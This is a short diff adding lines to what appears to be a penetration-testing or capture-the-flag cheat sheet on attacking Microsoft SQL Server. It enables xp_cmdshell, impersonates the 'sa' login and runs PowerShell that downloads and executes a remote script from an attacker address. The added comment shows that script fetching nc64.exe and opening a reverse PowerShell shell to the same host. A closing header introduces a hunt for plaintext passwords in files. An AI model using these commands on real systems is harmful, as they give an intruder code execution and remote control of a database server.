@@ -42,6 +42,11 @@ EXEC sp_configure 'xp_cmdshell', 1;
 RECONFIGURE;
 EXECUTE AS LOGIN = 'sa';
 EXEC xp_cmdshell "powershell -ep bypass iex(iwr http://10.10.14.82:8000/reverse.ps1 -usebasicp)";
+/*
+//reverse.ps1
+iwr http://10.10.14.82:8000/nc64.exe -outfile c:\\users\\public\\nc64.exe;
+c:\\users\\public\\nc64.exe -e powershell.exe 10.10.14.82 10001
+*/
 ==========(7)======================================================================================================================
 #find password stored in in plaintext in any files
 (gci: Alias for Get-ChildItem)
